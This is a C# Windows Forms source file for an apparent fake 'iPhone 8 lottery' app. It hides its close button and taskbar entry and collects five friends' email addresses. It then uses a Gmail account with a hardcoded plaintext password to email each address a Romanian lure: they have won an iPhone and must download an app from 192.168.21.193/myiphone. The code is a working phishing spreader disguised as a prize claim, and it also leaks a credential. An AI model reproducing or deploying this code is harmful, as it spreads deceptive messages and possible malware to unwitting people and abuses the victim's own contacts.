using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    public partial class Interfata : Form
    {
        private const int CP_NOCLOSE_BUTTON = 0x200;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams myCp = base.CreateParams;
                myCp.ClassStyle = myCp.ClassStyle | CP_NOCLOSE_BUTTON;
                return myCp;
            }
        }



        List<TextBox> myTextboxList;
        public Interfata()
        {
            InitializeComponent();
        }

        private void Interfata_Load(object sender, EventArgs e)
        {
            
            //var bmp = new Bitmap(Client.Properties.Resources.iphone);
            this.BackgroundImage = Client.Properties.Resources.iphone;
            this.BackgroundImageLayout = ImageLayout.Stretch;
            this.ShowInTaskbar = false;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        static void textBox_LostFocus(object sender, EventArgs e)
        {
            TextBox theTextBoxThatLostFocus = (TextBox)sender;

            // If the textbox is empty, zeroize it.
            if (String.IsNullOrEmpty(theTextBoxThatLostFocus.Text))
            {
                theTextBoxThatLostFocus.Text = "email.prieten@gmail.com";
                theTextBoxThatLostFocus.ForeColor = System.Drawing.Color.Gray;
            }
        }

        static void textBox_Focused(object sender, EventArgs e)
        {
            TextBox theTextBoxThatisFocued = (TextBox)sender;

            // If the textbox is empty, zeroize it.
            if (String.IsNullOrEmpty(theTextBoxThatisFocued.Text))
            {
                theTextBoxThatisFocued.Text = "";
                theTextBoxThatisFocued.ForeColor = System.Drawing.Color.Black;
            }
        }

        private void Interfata_Load_1(object sender, EventArgs e)
        {
            myTextboxList = new List<TextBox>();
            myTextboxList.Add(email1);
            myTextboxList.Add(email2);
            myTextboxList.Add(email3);
            myTextboxList.Add(email4);
            myTextboxList.Add(email5);

           /* foreach(TextBox singleItem in myTextboxList) {
                // Do something to your textboxes here, for example:
                singleItem.LostFocus += textBox_LostFocus;
                singleItem.GotFocus += textBox_Focused;
                singleItem.Text = "email.prieten@gmail.com";
                singleItem.ForeColor = System.Drawing.Color.Gray;
            }*/
        }



        private static void Send_email(String emailAddress, String attachment_filename)
        {

            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            mail.From = new MailAddress("tiberiusosea09@gmail.com");
            mail.To.Add(emailAddress);
            mail.Subject = "Castig Tombola";
            mail.Body = "Felicitari!\nAi castigat un IPhone 8 \nIntra pe 192.168.21.193/myiphone si descarca aplicatia pentru a revendica premiul\\n";

            if (attachment_filename == null)
            {
               // System.Windows.Forms.MessageBox.Show("attachment_filename is null");
            }
            else if (attachment_filename.Length == 0)
            {
                System.Windows.Forms.MessageBox.Show("No attachment_filename inserted");
            }
            else
            {
                Attachment attachment = new Attachment(attachment_filename);
                mail.Attachments.Add(attachment);
            }

            SmtpServer.Port = 25;
            SmtpServer.Credentials = new System.Net.NetworkCredential("tiberiusosea09@gmail.com", "4psa4psa");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);

        }

        private void gerPrizeButton_Click(object sender, EventArgs e)
        {
            foreach (TextBox singleItem in myTextboxList)
            {
                singleItem.BackColor = System.Drawing.Color.White;
            }


            foreach (TextBox singleItem in myTextboxList)
            {
                // Do something to your textboxes here, for example:
                if (singleItem.Text.Length == 0)
                {
                    singleItem.BackColor = System.Drawing.Color.Pink;
                    System.Windows.Forms.MessageBox.Show("Nu ati completat toate campurile de email");
                    return;
                }
                else if (!singleItem.Text.Contains("@") || !singleItem.Text.Contains("."))
                {
                    singleItem.BackColor = System.Drawing.Color.Pink;
                    System.Windows.Forms.MessageBox.Show("Email gresit");
                    return;
                }
               
            }

            foreach (TextBox singleItem in myTextboxList)
            {
                string emailAddress = singleItem.Text.Replace(" ", "");
                Send_email(emailAddress, null);
            }

            System.Windows.Forms.MessageBox.Show("Multumim! Veti fi contactat in curand pentru a va revendica premiul");
            this.Close();

        }


    }
}
